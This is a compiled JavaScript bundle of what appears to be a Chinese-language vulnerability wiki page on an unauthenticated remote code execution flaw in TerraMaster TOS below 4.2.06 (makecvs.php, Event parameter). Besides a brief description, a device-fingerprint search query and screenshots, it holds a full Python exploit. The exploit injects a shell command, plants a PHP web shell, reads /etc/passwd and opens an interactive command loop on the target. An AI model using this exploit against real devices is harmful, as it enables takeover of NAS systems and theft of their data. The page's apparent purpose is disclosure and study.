import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{o as s,c as a,e as t}from"./app-58e4a7d6.js";const e={},p=t(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>TerraMaster TOS 4.2.06 以下中 makecvs.php 存在任意文件写入，攻击者可以上传恶意文件控制服务器</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>TerraMaster TOS &lt; 4.2.06
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&quot;TerraMaster&quot; &amp;&amp; header=&quot;TOS&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面如下</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101950771.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>存在漏洞的为 <strong>/include/makecvs.php</strong> 中的Event参数</p><p>使用EXP文件上传并执行命令</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101950305.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment"># Exploit Title: TerraMaster TOS 4.2.06 - RCE (Unauthenticated)</span>
<span class="token comment"># Date: 12/12/2020</span>
<span class="token comment"># Exploit Author: IHTeam</span>
<span class="token comment"># Full Write-up: https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/</span>
<span class="token comment"># Vendor Homepage: https://www.terra-master.com/</span>
<span class="token comment"># Version: &lt;= 4.2.06</span>
<span class="token comment"># Tested on: 4.1.30, 4.2.06</span>

<span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">import</span> argparse
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> time
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse
<span class="token keyword">from</span> requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> InsecureRequestWarning

requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>InsecureRequestWarning<span class="token punctuation">)</span>

parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">&quot;TerraMaster TOS &lt;= 4.2.06 Unauth RCE&quot;</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--url&#39;</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token string">&#39;store&#39;</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">&#39;url&#39;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;Full URL and port e.g.: http://192.168.1.111:8081/&quot;</span><span class="token punctuation">)</span>
args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>

url <span class="token operator">=</span> args<span class="token punctuation">.</span>url
headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&#39;User-agent&#39;</span><span class="token punctuation">:</span><span class="token string">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36&#39;</span><span class="token punctuation">}</span>
epoch_time <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
shell_filename <span class="token operator">=</span> <span class="token string">&quot;debug&quot;</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>epoch_time<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&quot;.php&quot;</span>

<span class="token keyword">def</span> <span class="token function">check_endpoint</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token punctuation">)</span><span class="token punctuation">:</span>
	response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">&#39;/version&#39;</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] TerraMaster TOS version: &quot;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token keyword">else</span><span class="token punctuation">:</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\n[-] TerraMaster TOS response code: &quot;</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
		sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
		
<span class="token keyword">def</span> <span class="token function">upload_shell</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token punctuation">,</span> shell_filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
	payload <span class="token operator">=</span> <span class="token string">&quot;http|echo \\&quot;&lt;?php echo(passthru(\\\\$_GET[&#39;cmd&#39;]));?&gt;\\&quot; &gt;&gt; /usr/www/&quot;</span><span class="token operator">+</span>shell_filename<span class="token operator">+</span><span class="token string">&quot; &amp;&amp; chmod +x /usr/www/&quot;</span><span class="token operator">+</span>shell_filename<span class="token operator">+</span><span class="token string">&quot;||&quot;</span>
	payload <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> safe<span class="token operator">=</span><span class="token string">&#39;&#39;</span><span class="token punctuation">)</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[/] Uploading shell...&quot;</span><span class="token punctuation">)</span>
	response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">&#39;/include/makecvs.php?Event=&#39;</span><span class="token operator">+</span>payload<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
	time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
	response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">&#39;/&#39;</span><span class="token operator">+</span>shell_filename<span class="token operator">+</span><span class="token string">&#39;?cmd=cat /etc/passwd&#39;</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">&#39;root:&#39;</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>content<span class="token punctuation">,</span> <span class="token string">&#39;utf-8&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Upload succeeded&quot;</span><span class="token punctuation">)</span>
	<span class="token keyword">else</span><span class="token punctuation">:</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\n[-] Error uploading shell: &quot;</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>content<span class="token punctuation">)</span>
		sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">interactive_shell</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token punctuation">,</span> shell_filename<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
	response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">&#39;/&#39;</span><span class="token operator">+</span>shell_filename<span class="token operator">+</span><span class="token string">&#39;?cmd=&#39;</span><span class="token operator">+</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> safe<span class="token operator">=</span><span class="token string">&#39;&#39;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&quot;\\n&quot;</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">delete_shell</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token punctuation">,</span> shell_filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
	delcmd <span class="token operator">=</span> <span class="token string">&quot;rm /usr/www/&quot;</span><span class="token operator">+</span>shell_filename
	response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">&#39;/&#39;</span><span class="token operator">+</span>shell_filename<span class="token operator">+</span><span class="token string">&#39;?cmd=&#39;</span><span class="token operator">+</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>delcmd<span class="token punctuation">,</span> safe<span class="token operator">=</span><span class="token string">&#39;&#39;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\n[+] Shell deleted&quot;</span><span class="token punctuation">)</span>

upload_shell<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token punctuation">,</span> shell_filename<span class="token punctuation">)</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
	<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
		cmd <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;# &quot;</span><span class="token punctuation">)</span>
		interactive_shell<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token punctuation">,</span> shell_filename<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>
<span class="token keyword">except</span><span class="token punctuation">:</span>
	delete_shell<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token punctuation">,</span> shell_filename<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,14),o=[p];function c(l,i){return s(),a("div",null,o)}const k=n(e,[["render",c],["__file","TerraMaster TOS RCE CVE-2020-28188.html.vue"]]);export{k as default};
